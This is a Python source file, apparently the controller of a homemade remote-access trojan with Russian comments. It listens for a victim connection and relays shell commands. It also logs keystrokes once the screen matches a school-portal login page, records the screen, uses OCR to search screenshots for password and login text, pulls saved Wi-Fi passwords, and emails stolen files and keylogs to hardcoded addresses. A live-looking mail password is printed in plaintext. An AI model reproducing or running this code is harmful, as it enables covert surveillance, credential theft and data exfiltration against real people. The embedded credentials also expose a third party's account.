# Добавляем необходимые подклассы - MIME-типы
import mimetypes  # Импорт класса для обработки неизвестных MIME-типов, базирующихся на расширении файла
import subprocess

import smtplib  # Импортируем библиотеку по работе с SMTP
import socket, cv2
from email.mime.audio import MIMEAudio  # Аудио
from email.mime.image import MIMEImage  # Изображения
from email.mime.multipart import MIMEMultipart  # Многокомпонентный объект
from email.mime.text import MIMEText  # Текст/HTML

import stat
import os
from pynput import keyboard

msg = MIMEMultipart()
global cd
global names
global path3ss
cd = False
namess = []
path3ss = []

def ch_dir(dir):
    command = "ch_dir " + dir
    client.send(command.encode("cp866"))
    subprocess.getoutput("dir")

def py_to_exe(filename):
    client.send(("py_to_exe" + filename).encode("cp65001"))
    print(client.recv(1024 * 1024 * 1024).decode("utf-8"))


def keylog():
    from pynput.keyboard import Key, Listener
    import logging
    from pynput import keyboard
    logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format="%(message)s")

    def on_press(key):
        if key == keyboard.Key.esc or key == keyboard.Key.enter:
            return False  # stop listener
        try:
            k = key.char  # single-char keys
        except:
            k = key.name  # other keys
        logging.info(str(key))

    """with open("h.txt", "a+", encoding="utf-8") as pop:
        pop.write(on_press())"""
    with Listener(on_press=on_press) as listener:
        listener.join()
    send_email("verart1@yandex.ru", "keylog.txt")

def see_scr():
    keylogg = False
    import pyautogui
    screen = pyautogui.screenshot("screenshot.png")
    # print(screen)
    import pyautogui
    import cv2
    r = True
    while r:
        screen = pyautogui.screenshot("screenshot.png")
        if CompareHash(CalcImageHash("screenshot.png"), CalcImageHash("eschool.png")) <= 26:
            r = keylog()
#       else:
#            print(CompareHash(CalcImageHash("screenshot.png"), CalcImageHash("eschool.png")))


"""
def def_hide():
    class myThread(threading.Thread):
        def __init__(self, threadID, name, counter):
            threading.Thread.__init__(self)
            self.threadID = threadID
            self.name = name
            self.counter = counter

        def run(self):
            main()
    
    def hide():
        import win32console, win32gui
        window = win32console.GetConsoleWindow()
        win32gui.ShowWindow(window, 0)
        return True
    
    # Запуск кейлогера
    def main():
        hm.KeyDown = OnKeyboardEvent
        hm.HookKeyboard()
        pythoncom.PumpMessages()
    
    hide()
    hm = pyHook.HookManager()
    disallow_Multiple_Instances()
    thread = myThread(1, "Thread", 1)
    thread.start()
"""

def video():
    keylogg = False
    import pyautogui
    screen = pyautogui.screenshot("screenshot.png")
    # print(screen)

    # Функция вычисления хэша

    if CompareHash(CalcImageHash("screenshot.png"), CalcImageHash("eschool.png")) < 25:
        kok = True
    else:
        kok = False

    #timer = perf_counter()
    #import time

    import cv2, pyautogui
    import numpy as np

    SCREEN_SIZE = pyautogui.size()
    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    out = cv2.VideoWriter("output.avi", fourcc, 20.0, (SCREEN_SIZE))

    while True:
        try:
            if CompareHash(CalcImageHash("screenshot.png"), CalcImageHash("eschool.png")) < 25:
                kok = True
            else:
                kok = False
            img = pyautogui.screenshot()

            frame = np.array(img)

            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)

            out.write(frame)
            #cv2.waitKey(1) == ord("]")
            # cv2.imshow("screenshot", frame)
            """
            if perf_counter() - timer == 10:
                break
                """
     #       time.sleep(10)
      #      break
            # time.sleep(0.1)
            if not kok:
                break
        except:
            break
    cv2.destroyAllWindows()
    out.release()
    return out

def CalcImageHash(FileName):
    image = cv2.imread(FileName)  # Прочитаем картинку
    resized = cv2.resize(image, (8, 8), interpolation=cv2.INTER_AREA)  # Уменьшим картинку
    gray_image = cv2.cvtColor(resized, cv2.COLOR_BGR2GRAY)  # Переведем в черно-белый формат
    avg = gray_image.mean()  # Среднее значение пикселя
    ret, threshold_image = cv2.threshold(gray_image, avg, 255, 0)  # Бинаризация по порогу

    # Рассчитаем хэш
    _hash = ""
    for x in range(8):
        for y in range(8):
            val = threshold_image[x, y]
            if val == 255:
                _hash = _hash + "1"
            else:
                _hash = _hash + "0"

    return _hash

def CompareHash(hash1, hash2):
    l = len(hash1)
    i = 0
    count = 0
    while i < l:
        if hash1[i] != hash2[i]:
            count = count + 1
        i = i + 1
    return count


def read_file(command):
    client.send((command.encode("cp866")))
    """filepath = os.path.abspath(python)
    ctype, encoding = mimetypes.guess_type(filepath)
    maintype, subtype = ctype.split('/', 1)  # Получаем тип и подтип
    if maintype == 'text':  # Если текстовый файл
        with open(python, "r", encoding='utf-8') as file:  # снова читаем атакуемый файл
            original_code = ""  # вводим переменную для исходного кода атакуемого файла
            for line in file:
                original_code += line  # построчно вводим код в переменную
        print(original_code)
        return original_code
    else:
        print("Not a text file")"""

def send_email(addr_to, f1le, msg_subj="Test", msg_text="hello"):
    addr_from = "artod2023@mail.ru"                      # Отправитель
    password = "WtQd5pY4iDBPcBWmtuVR"                                # Пароль

    #msg = MIMEMultipart()                                   # Создаем сообщение
    msg['From'] = addr_from                              # Адресат
    msg['To'] = addr_to                                # Получатель
    msg['Subject'] = msg_subj                               # Тема сообщения

    body = msg_text                                         # Текст сообщения
    msg.attach(MIMEText(body, 'plain'))                     # Добавляем в сообщение текст



    #process_attachement(msg, files)
    try:
        atach_file(msg, f1le)
    except:
        pass

    #======== Этот блок настраивается для каждого почтового провайдера отдельно ===============================================
    server = smtplib.SMTP_SSL('smtp.mail.ru')        # Создаем объект SMTP
    #server.starttls()                                      # Начинаем шифрованный обмен по TLS
    #server.set_debuglevel(True)                            # Включаем режим отладки, если не нужен - можно закомментировать
    server.login(addr_from, password)                       # Получаем доступ
    server.send_message(msg, from_addr=addr_from, to_addrs=addr_to)                            # Отправляем сообщение
    server.quit()                                           # Выходим
    #==========================================================================================================================

def atach_file(msg, filepath):
    ctype, encoding = mimetypes.guess_type(filepath)
    maintype, subtype = ctype.split('/', 1)  # Получаем тип и подтип
    if maintype == 'text':  # Если текстовый файл
        with open(filepath, "r", encoding="utf-8") as fp:  # Открываем файл для чтения
            file = MIMEText(fp.read(), _subtype=subtype)  # Используем тип MIMEText
            fp.close()  # После использования файл обязательно нужно закрыть
            msg.attach(file)
    elif maintype == 'image':  # Если изображение
        with open(filepath, 'rb') as fp:
            file = MIMEImage(fp.read(), _subtype=subtype)
            fp.close()
            msg.attach(file)
    elif maintype == 'audio':  # Если аудио
        with open(filepath, 'rb') as fp:
            file = MIMEAudio(fp.read(), _subtype=subtype)
            fp.close()
            msg.attach(file)
    file.add_header('Content-Disposition', 'attachment', filename=(filepath.split("\\"))[-1])  # Добавляем заголовки


email = "artod2023@mail.ru"
password = "WtQd5pY4iDBPcBWmtuVR"
dest_email = "verart1@yandex.ru"
#send_email(dest_email, file)

def walk(msg, dir):  # парсер директорий
    names = []
    path3s = []
    for name in os.listdir(dir):
        path3 = os.path.join(dir, name)
        path3s.append(path3)
        names.append(name)
    for name in os.listdir(dir):
        path3 = os.path.join(dir, name)
        if os.path.isfile(path3):  # если файт, ...  # ... ищем файлы с указанным расширением и ...
            atach_file(msg, path3)  # ... активируем функцию на нём
        else:  # если папка, ...
            names.append(name)
            namess.append(names)
            path3ss.append(path3)
            path3ss.append(path3s)

            walk(msg, path3)  # ... заходим в неё и повторяем

def hlp():
    print("""
    cd [-D] - CHANGE DIRECTORY OR DISK: -D - DIRECTORY
    ch_dir [-D] - CHANGE DIRECTORY OR DISK: -D - DIRECTORY
    cp_dir [-D] - COPY DIRECTORY TO THE EMAIL: -D - DIRECTORY
    cpy [-F] - COPY FILE TO THE EMAIL: -F - FILE
    hlp - SHOW THIS WINDOW
    edit [-F] - EDIT TEXT FILE IN NOTEPAD: -F - FILE
    py_to_exe: [-F] - CONVERT PY FILE TO EXE FILE AND SAVE IN THE DIRECTORY WITH NAME OF THE FILE: -F - FILE
    read [-F] - READ TEXT FILE OR SHOW ALL FILES AND DIRECTORIES IN DIRECTORY: -F - FILE OR DIRECTORY
    delete [-F] - DELETE FILE FROM THE DIRECTORY: -F - FILE
    screenshot - SEND THE SCREENSHOT TO THE EMAIL
    make_d [-N] - MAKING DIRECTORY WITH NAME: -N - NAME
    show_geo - SHOWS GLOBAL, LOCAL IP, GEOLOCATION
    show_wifi_pass - SHOW SAVED WIFI PASSWORDS
    //def_hide - default alg to hide this program
    rasp_scr [-I] [-T] - SEARCHING SPECIAL STRING IN IMAGE: -I - IMAGE (DEFAULT NONE), -T TEXT
    """)
    return None

def dub_edit():
    or_co1 = ""
    or_co = ""
    print("Input a code by a line:")
    while or_co1 != "abberation":
        or_co1 = input(">> ")
        if or_co1 != "abberation":
            or_co += or_co1
    return or_co

def rasp_scr(name_image):
    import os.path
    import cv2
    import easyocr
    import matplotlib.pyplot as plt
    im_1_path = os.path.abspath(name_image)

    def recognize_text(img_path):
        txt = ""
        i1 = 0
        '''loads an image and recognizes text.'''
        reader = easyocr.Reader(['ru'])
        txt0 = reader.readtext(img_path)
        for i in txt0:
            txt += i[1]
            if "Ваш пароль" in txt or "Ваш логин" in txt:
                return "Yes"
        return txt
    result = recognize_text(im_1_path)
    return result


def rasp_scr1(name_image, string):
    import os.path
    import cv2
    import easyocr
    import matplotlib.pyplot as plt
    im_1_path = os.path.abspath(name_image)

    def recognize_text(img_path):
        txt = ""
        i1 = 0
        '''loads an image and recognizes text.'''
        reader = easyocr.Reader(['ru'])
        txt0 = reader.readtext(img_path)
        for i in txt0:
            txt += i[1]
            if string in txt:
                print("Here")
                break
            """i1 += 1  
            if i[1] == "Войти":
                n = i1 - 5
                break"""
        return txt
    result = recognize_text(im_1_path)
#rasp_scr("test.png")

def edit(command):
    client.send(command.encode("cp65001"))
    """
    or_co = read_file(file)
    while or_co != "abberation":
        or_co += input("Input a code by a line>> ")
    client.send(("edit\n" + or_co).encode("cp65001"))
    """

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
local_ip = str(socket.gethostbyname(socket.gethostname()))
print(local_ip)
s.bind(("0.0.0.0", 8888))
s.listen(5)
client, addr = s.accept()
#keys = []
ch_dir_ch = False
cur_dir = client.recv(1024).decode("cp65001")
client.send(local_ip.encode("cp65001"))
while True:
    command = input(cur_dir + ">> ")
    if "cp_dir" in command:
        dr0 = (command.split(" "))[1]
        client.send("echo %cd%".encode("cp65001"))
        #dr = str(((client.recv(1024).decode("cp65001")).split("\n"))[-1])[31:-1]
        dr = os.path.abspath(dr0)
        #dr += "\\" + dr0
        cd = False
        walk(msg, dr)
        send_email(dest_email, msg)
    elif "cpy" in command:
        cd = True
        file = (command.split(" "))[1]
        send_email(dest_email, file)
    elif command == "send_video":
        video = video()
        """mesag = MIMEMultipart()
        send_email(mesag, video)"""
    elif "py_to_exe" in command:
        fi = (command.split(" "))[-1]
        py_to_exe(fi)
    elif "read" in command:
        read_file(command)
        result_output = client.recv(4096 * 1024).decode("cp65001")
        print(result_output)
    elif "cd" in command:
        if not ch_dir_ch:
            #i = input("Did you mean 'ch_dir'? (Y/N)").lower()
            i = "y"
            if i == "y":
                ch_dir((command.split(" "))[-1])
                cur_dir = client.recv(1024).decode("cp65001")
                #u = input("Do you want to change 'cd' command to 'ch_dir' automaticaly? (Y/N)").lower()
                u = "y"
                if u == "y":
                    ch_dir_ch = True
                    continue
                else:
                    ch_dir_ch = False
            else:
                print("Unavailable command.")
                pass
        if ch_dir_ch:
            if "cd" in command:
                command = "ch_dir " + (command.split(" "))[-1]
                ch_dir((command.split(" "))[-1])
                cur_dir = client.recv(1024).decode("cp65001")
    elif "ch_dir" in command:
        ch_dir((command.split(" "))[-1])
        cur_dir = client.recv(1024).decode("cp65001")
    elif "delete" in command:
        client.send((command.encode("cp65001")))
    elif command == "hlp":
        hlp()
        continue
    elif "make_d" in command:
        client.send((command.encode("cp65001")))
        cur_dir = client.recv(1024).decode("cp65001")
    elif command == "show_geo":
        client.send((command.encode("cp65001")))
        print((client.recv(4096).decode("cp65001")))
    elif "edit" in command:
        edit(command)
        original_code = client.recv(1024).decode("utf-8")
        print(original_code)

        #oc = dub_edit()

        with open("temp.txt", "w") as file:
            file.write(original_code)
            file.close()
        os.system("start temp.txt")
        ready = input("Are you ready? ")

        file = open("temp.txt", "r")
        p = file.read()
        #print(client.recv(1024).decode("cp65001"))
        client.send(p.encode("utf-8"))
        print(client.recv(1024).decode("utf-8"))
        file.close()
        os.chmod(os.path.abspath("temp.txt"), stat.S_IWRITE)
        os.system("del temp.txt")
    elif "rasp_scr" in command:
        if len(command.split(" ")) > 1:
            rasp_scr1((cdommand.split(" "))[1], (command.split(" "))[2])
        else:
            image = input("Input a name of the image>> ")
            text = input("Input a text>> ")
            rasp_scr1(image, text)
    elif "cd" not in command and command != "":
        client.send(command.encode("cp65001"))
        result_output = client.recv(4096).decode("cp65001").split("╨Т┬а")
        print(" ".join(result_output))
client.close()
s.close()
